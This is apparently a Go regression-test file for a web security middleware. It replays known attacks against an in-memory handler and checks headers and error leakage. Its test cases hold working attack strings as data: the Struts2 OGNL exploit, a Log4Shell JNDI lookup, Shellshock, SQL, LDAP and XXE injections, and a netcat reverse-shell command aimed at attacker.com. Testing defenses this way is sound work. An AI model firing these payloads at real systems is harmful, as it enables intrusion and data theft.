package security

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"go.uber.org/zap/zaptest"
)

// TestSecurityRegressions tests for known security vulnerabilities that should remain fixed
func TestSecurityRegressions(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Create a test handler that simulates various application behaviors
	testHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/echo":
			// Echo back query parameters (potential XSS vector)
			query := r.URL.Query().Get("msg")
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprintf(w, "<html><body>Message: %s</body></html>", query)
		case "/file":
			// File access endpoint (potential path traversal)
			path := r.URL.Query().Get("path")
			if strings.Contains(path, "..") {
				http.Error(w, "Path traversal detected", http.StatusBadRequest)
				return
			}
			fmt.Fprintf(w, "File content for: %s", path)
		case "/admin":
			// Admin endpoint (potential privilege escalation)
			auth := r.Header.Get("Authorization")
			if auth != "Bearer admin-secret" {
				http.Error(w, "Unauthorized", http.StatusUnauthorized)
				return
			}
			fmt.Fprintf(w, "Admin panel")
		case "/error":
			// Error endpoint that might leak information
			panic("internal error: database connection failed at /var/lib/secrets/db.conf")
		default:
			w.WriteHeader(http.StatusOK)
			fmt.Fprintf(w, "OK")
		}
	})

	// Wrap with panic recovery
	recoveryHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if r := recover(); r != nil {
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}()
		testHandler.ServeHTTP(w, r)
	})

	secureHandler := hardener.SecurityMiddleware()(recoveryHandler)

	// Test cases for known vulnerability patterns
	testCases := []struct {
		name           string
		method         string
		path           string
		headers        map[string]string
		expectedStatus int
		shouldBlock    bool
		description    string
	}{
		{
			name:           "CVE-2021-44228_LogShell_Attempt",
			method:         "GET",
			path:           "/echo?msg=${jndi:ldap://evil.com/a}",
			expectedStatus: http.StatusOK,
			shouldBlock:    false, // Headers should prevent execution
			description:    "Log4Shell-style JNDI injection attempt",
		},
		{
			name:           "CVE-2020-1938_AJP_Ghostcat",
			method:         "GET",
			path:           "/WEB-INF/web.xml",
			headers:        map[string]string{"AJP_REMOTE_PORT": "12345"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false, // Should be blocked by application logic
			description:    "Apache Tomcat AJP Ghostcat vulnerability attempt",
		},
		{
			name:           "CVE-2021-26855_Exchange_SSRF",
			method:         "POST",
			path:           "/owa/auth/x.js",
			headers:        map[string]string{"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/DDI/DDIService.svc/GetObject"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Microsoft Exchange SSRF vulnerability attempt",
		},
		{
			name:           "CVE-2017-5638_Struts2_RCE",
			method:         "POST",
			path:           "/upload",
			headers:        map[string]string{"Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Apache Struts2 RCE vulnerability attempt",
		},
		{
			name:           "CVE-2014-6271_Shellshock",
			method:         "GET",
			path:           "/cgi-bin/test.cgi",
			headers:        map[string]string{"User-Agent": "() { :; }; echo; echo; /bin/bash -c \"cat /etc/passwd\""},
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Bash Shellshock vulnerability attempt",
		},
		{
			name:           "SQL_Injection_Union_Based",
			method:         "GET",
			path:           "/search?q=' UNION SELECT username,password FROM users--",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "SQL injection with UNION attack",
		},
		{
			name:           "XSS_Reflected_Script_Tag",
			method:         "GET",
			path:           "/echo?msg=<script>alert('XSS')</script>",
			expectedStatus: http.StatusOK,
			shouldBlock:    false, // Headers should prevent execution
			description:    "Reflected XSS with script tag",
		},
		{
			name:           "XSS_DOM_Based_JavaScript",
			method:         "GET",
			path:           "/echo?msg=javascript:alert('XSS')",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "DOM-based XSS with javascript: protocol",
		},
		{
			name:           "CSRF_State_Changing_Request",
			method:         "POST",
			path:           "/admin/delete-user",
			headers:        map[string]string{"Origin": "http://evil.com"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false, // Should be blocked by CSRF protection
			description:    "Cross-Site Request Forgery attempt",
		},
		{
			name:           "Directory_Traversal_Encoded",
			method:         "GET",
			path:           "/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			expectedStatus: http.StatusBadRequest,
			shouldBlock:    true,
			description:    "Directory traversal with URL encoding",
		},
		{
			name:           "HTTP_Response_Splitting",
			method:         "GET",
			path:           "/redirect?url=http://example.com%0d%0aSet-Cookie:%20admin=true",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "HTTP response splitting attempt",
		},
		{
			name:           "Server_Side_Template_Injection",
			method:         "POST",
			path:           "/template",
			headers:        map[string]string{"Content-Type": "application/json"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Server-side template injection attempt",
		},
		{
			name:           "XML_External_Entity_XXE",
			method:         "POST",
			path:           "/xml",
			headers:        map[string]string{"Content-Type": "application/xml"},
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "XML External Entity (XXE) injection attempt",
		},
		{
			name:           "LDAP_Injection",
			method:         "GET",
			path:           "/search?user=admin)(|(password=*))",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "LDAP injection attempt",
		},
		{
			name:           "Command_Injection_Semicolon",
			method:         "GET",
			path:           "/ping?host=127.0.0.1;cat /etc/passwd",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Command injection with semicolon",
		},
		{
			name:           "Command_Injection_Pipe",
			method:         "GET",
			path:           "/ping?host=127.0.0.1|nc -e /bin/sh attacker.com 4444",
			expectedStatus: http.StatusOK,
			shouldBlock:    false,
			description:    "Command injection with pipe",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var req *http.Request

			if tc.method == "POST" {
				body := ""
				if strings.Contains(tc.name, "SSTI") {
					body = `{"template": "{{7*7}}"}`
				} else if strings.Contains(tc.name, "XXE") {
					body = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
				}
				req = httptest.NewRequest(tc.method, tc.path, strings.NewReader(body))
			} else {
				req = httptest.NewRequest(tc.method, tc.path, nil)
			}

			// Add custom headers
			for key, value := range tc.headers {
				req.Header.Set(key, value)
			}

			w := httptest.NewRecorder()
			secureHandler.ServeHTTP(w, req)

			// Verify security headers are always present (regression protection)
			requiredHeaders := map[string]string{
				"X-Content-Type-Options":  "nosniff",
				"X-Frame-Options":         "DENY",
				"X-XSS-Protection":        "1; mode=block",
				"Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
				"Server":                  "MCP-Airlock",
			}

			for header, expectedValue := range requiredHeaders {
				if got := w.Header().Get(header); got != expectedValue {
					t.Errorf("Security header regression: %s expected %q, got %q", header, expectedValue, got)
				}
			}

			// Verify response doesn't contain sensitive information
			body := w.Body.String()
			sensitivePatterns := []string{
				"/var/lib/secrets",
				"database connection failed",
				"internal error:",
				"stack trace",
				"goroutine",
				"panic:",
			}

			for _, pattern := range sensitivePatterns {
				if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
					t.Errorf("Response contains sensitive information (%s): %s", pattern, tc.description)
				}
			}

			// Verify server header doesn't leak information
			server := w.Header().Get("Server")
			if strings.Contains(strings.ToLower(server), "go") ||
				strings.Contains(strings.ToLower(server), "version") {
				t.Errorf("Server header leaks information: %s", server)
			}

			t.Logf("Test %s: Status %d, Description: %s", tc.name, w.Code, tc.description)
		})
	}
}

// TestPolicyBypassRegressions tests for policy bypass vulnerabilities
func TestPolicyBypassRegressions(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate a policy-protected handler
	policyHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Simulate policy check
		auth := r.Header.Get("Authorization")
		if !strings.HasPrefix(auth, "Bearer valid-") {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Simulate resource access check
		resource := r.URL.Query().Get("resource")
		if strings.Contains(resource, "admin") && !strings.Contains(auth, "admin") {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}

		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Access granted to: %s", resource)
	})

	secureHandler := hardener.SecurityMiddleware()(policyHandler)

	bypassAttempts := []struct {
		name        string
		auth        string
		resource    string
		method      string
		headers     map[string]string
		shouldBlock bool
		description string
	}{
		{
			name:        "Token_Manipulation_Case",
			auth:        "Bearer VALID-token",
			resource:    "user-data",
			method:      "GET",
			shouldBlock: false, // This would be handled by application logic
			description: "Case manipulation to bypass token validation",
		},
		{
			name:        "Token_Manipulation_Encoding",
			auth:        "Bearer %76%61%6c%69%64-token", // "valid" in hex
			resource:    "user-data",
			method:      "GET",
			shouldBlock: false, // This would be handled by application logic
			description: "URL encoding to bypass token validation",
		},
		{
			name:        "Resource_Path_Traversal",
			auth:        "Bearer valid-user-token",
			resource:    "../admin/secrets",
			method:      "GET",
			shouldBlock: false, // Should be handled by application
			description: "Path traversal in resource parameter",
		},
		{
			name:        "Resource_Null_Byte_Injection",
			auth:        "Bearer valid-user-token",
			resource:    "user-data\x00admin-secrets",
			method:      "GET",
			shouldBlock: false,
			description: "Null byte injection in resource parameter",
		},
		{
			name:        "HTTP_Method_Override",
			auth:        "Bearer valid-user-token",
			resource:    "admin-panel",
			method:      "GET",
			headers:     map[string]string{"X-HTTP-Method-Override": "POST"},
			shouldBlock: false,
			description: "HTTP method override to bypass restrictions",
		},
		{
			name:        "Header_Injection_CRLF",
			auth:        "Bearer valid-user-token\r\nX-Admin: true",
			resource:    "admin-panel",
			method:      "GET",
			shouldBlock: false,
			description: "CRLF injection in authorization header",
		},
		{
			name:        "Unicode_Normalization",
			auth:        "Bearer valid-user-token",
			resource:    "adm\u0131n-panel", // Turkish dotless i
			method:      "GET",
			shouldBlock: false,
			description: "Unicode normalization bypass",
		},
		{
			name:        "Double_URL_Encoding",
			auth:        "Bearer valid-user-token",
			resource:    "%2561%2564%256d%2569%256e", // double-encoded "admin"
			method:      "GET",
			shouldBlock: false,
			description: "Double URL encoding bypass",
		},
		{
			name:        "JWT_Algorithm_Confusion",
			auth:        "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
			resource:    "admin-panel",
			method:      "GET",
			shouldBlock: false, // This would be handled by application logic
			description: "JWT algorithm confusion (none algorithm)",
		},
		{
			name:        "SQL_Injection_In_Auth",
			auth:        "Bearer valid'; DROP TABLE tokens; --",
			resource:    "user-data",
			method:      "GET",
			shouldBlock: false, // This would be handled by application logic
			description: "SQL injection in authorization token",
		},
	}

	for _, attempt := range bypassAttempts {
		t.Run(fmt.Sprintf("PolicyBypass_%s", attempt.name), func(t *testing.T) {
			// URL encode the resource parameter to avoid invalid URLs
			encodedResource := url.QueryEscape(attempt.resource)
			req := httptest.NewRequest(attempt.method, fmt.Sprintf("/api?resource=%s", encodedResource), nil)
			req.Header.Set("Authorization", attempt.auth)

			// Add additional headers
			for key, value := range attempt.headers {
				req.Header.Set(key, value)
			}

			w := httptest.NewRecorder()
			secureHandler.ServeHTTP(w, req)

			// Verify security headers are present (regression protection)
			if w.Header().Get("X-Content-Type-Options") != "nosniff" {
				t.Errorf("Security header missing in bypass attempt: %s", attempt.name)
			}

			// Check if bypass was successful
			if w.Code == http.StatusOK && strings.Contains(w.Body.String(), "admin") {
				if attempt.shouldBlock {
					t.Errorf("Policy bypass successful (should have been blocked): %s", attempt.description)
				} else {
					t.Logf("Policy bypass detected but handled by application logic: %s", attempt.description)
				}
			}

			t.Logf("Bypass attempt %s: Status %d, Description: %s", attempt.name, w.Code, attempt.description)
		})
	}
}

// TestTimingAttackResistance tests resistance to timing attacks
func TestTimingAttackResistance(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Simulate authentication handler that might be vulnerable to timing attacks
	authHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		validToken := "Bearer secret-token-12345"

		// Simulate constant-time comparison (in real implementation)
		if token == validToken {
			w.WriteHeader(http.StatusOK)
			fmt.Fprintf(w, "Authenticated")
		} else {
			// Add artificial delay to make timing more consistent
			time.Sleep(1 * time.Millisecond)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
		}
	})

	secureHandler := hardener.SecurityMiddleware()(authHandler)

	// Test tokens of varying lengths and similarities
	testTokens := []string{
		"Bearer a",
		"Bearer secret",
		"Bearer secret-token",
		"Bearer secret-token-1",
		"Bearer secret-token-12",
		"Bearer secret-token-123",
		"Bearer secret-token-1234",
		"Bearer secret-token-12345", // Valid token
		"Bearer secret-token-123456",
		"Bearer wrong-token-12345",
		"Bearer xecret-token-12345", // One character different
	}

	timings := make(map[string]time.Duration)

	for _, token := range testTokens {
		// Measure multiple times and take average
		var totalDuration time.Duration
		const iterations = 10

		for i := 0; i < iterations; i++ {
			req := httptest.NewRequest("GET", "/auth", nil)
			req.Header.Set("Authorization", token)
			w := httptest.NewRecorder()

			start := time.Now()
			secureHandler.ServeHTTP(w, req)
			duration := time.Since(start)

			totalDuration += duration
		}

		avgDuration := totalDuration / iterations
		timings[token] = avgDuration

		t.Logf("Token: %s, Avg Duration: %v", token, avgDuration)
	}

	// Check for significant timing differences that could indicate vulnerability
	var durations []time.Duration
	for _, duration := range timings {
		durations = append(durations, duration)
	}

	if len(durations) > 1 {
		var min, max = durations[0], durations[0]
		for _, d := range durations {
			if d < min {
				min = d
			}
			if d > max {
				max = d
			}
		}

		// If the difference is more than 10x, it might indicate a timing vulnerability
		if max > min*10 {
			t.Logf("Warning: Significant timing difference detected (min: %v, max: %v)", min, max)
			t.Logf("This might indicate a timing attack vulnerability")
		}
	}
}

// TestSecurityHeaderRegression tests that security headers remain consistent
func TestSecurityHeaderRegression(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	secureHandler := hardener.SecurityMiddleware()(handler)

	// Expected security headers (these should never change without explicit decision)
	expectedHeaders := map[string]string{
		"X-Content-Type-Options":  "nosniff",
		"X-Frame-Options":         "DENY",
		"X-XSS-Protection":        "1; mode=block",
		"Referrer-Policy":         "strict-origin-when-cross-origin",
		"Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
		"Server":                  "MCP-Airlock",
	}

	// Test various request types
	testRequests := []struct {
		method string
		path   string
		body   string
	}{
		{"GET", "/", ""},
		{"POST", "/api", `{"data": "test"}`},
		{"PUT", "/resource/123", `{"update": "data"}`},
		{"DELETE", "/resource/123", ""},
		{"HEAD", "/", ""},
		{"OPTIONS", "/", ""},
	}

	for _, testReq := range testRequests {
		t.Run(fmt.Sprintf("%s_%s", testReq.method, testReq.path), func(t *testing.T) {
			var req *http.Request
			if testReq.body != "" {
				req = httptest.NewRequest(testReq.method, testReq.path, strings.NewReader(testReq.body))
				req.Header.Set("Content-Type", "application/json")
			} else {
				req = httptest.NewRequest(testReq.method, testReq.path, nil)
			}

			w := httptest.NewRecorder()
			secureHandler.ServeHTTP(w, req)

			// Verify all expected headers are present with correct values
			for header, expectedValue := range expectedHeaders {
				if got := w.Header().Get(header); got != expectedValue {
					t.Errorf("Header regression for %s %s: header %s expected %q, got %q",
						testReq.method, testReq.path, header, expectedValue, got)
				}
			}

			// Verify no forbidden headers are present
			forbiddenHeaders := []string{
				"X-Powered-By",
				"X-AspNet-Version",
				"X-AspNetMvc-Version",
				"X-Generator",
			}

			for _, header := range forbiddenHeaders {
				if value := w.Header().Get(header); value != "" {
					t.Errorf("Forbidden header present for %s %s: %s = %s",
						testReq.method, testReq.path, header, value)
				}
			}
		})
	}
}

// TestErrorHandlingRegression tests that error handling doesn't leak information
func TestErrorHandlingRegression(t *testing.T) {
	logger := zaptest.NewLogger(t)
	hardener, err := NewSecurityHardener(nil, logger)
	if err != nil {
		t.Fatalf("Failed to create security hardener: %v", err)
	}

	// Handler that can produce various types of errors
	errorHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		errorType := r.URL.Query().Get("error")

		switch errorType {
		case "panic":
			panic("sensitive information: database password is 'secret123'")
		case "stack":
			// Simulate a stack trace error
			panic(fmt.Errorf("error at /home/user/.config/app/secrets.json:42"))
		case "sql":
			http.Error(w, "SQL Error: Table 'users' doesn't exist in database 'production_db'", http.StatusInternalServerError)
		case "path":
			http.Error(w, "File not found: /var/lib/app/secrets/config.json", http.StatusNotFound)
		default:
			w.WriteHeader(http.StatusOK)
		}
	})

	// Add panic recovery
	recoveryHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if r := recover(); r != nil {
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}()
		errorHandler.ServeHTTP(w, r)
	})

	secureHandler := hardener.SecurityMiddleware()(recoveryHandler)

	errorTests := []struct {
		errorType   string
		description string
	}{
		{"panic", "Panic with sensitive information"},
		{"stack", "Stack trace with file paths"},
		{"sql", "SQL error with database details"},
		{"path", "File path in error message"},
	}

	for _, test := range errorTests {
		t.Run(fmt.Sprintf("ErrorRegression_%s", test.errorType), func(t *testing.T) {
			req := httptest.NewRequest("GET", fmt.Sprintf("/?error=%s", test.errorType), nil)
			w := httptest.NewRecorder()

			secureHandler.ServeHTTP(w, req)

			body := w.Body.String()

			// Check that sensitive information is not leaked
			sensitivePatterns := []string{
				"secret123",
				"password",
				"/home/user",
				"/var/lib",
				"production_db",
				"secrets.json",
				"config.json",
				"panic:",
				"goroutine",
				"runtime.",
			}

			for _, pattern := range sensitivePatterns {
				if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
					t.Errorf("Error response contains sensitive information (%s) for %s: %s",
						pattern, test.description, body)
				}
			}

			// Verify security headers are still present
			if w.Header().Get("X-Content-Type-Options") != "nosniff" {
				t.Errorf("Security header missing in error response for %s", test.description)
			}

			// Should return generic error message
			if test.errorType == "panic" || test.errorType == "stack" {
				if !strings.Contains(body, "Internal Server Error") {
					t.Errorf("Should return generic error message for %s, got: %s", test.description, body)
				}
			}
		})
	}
}
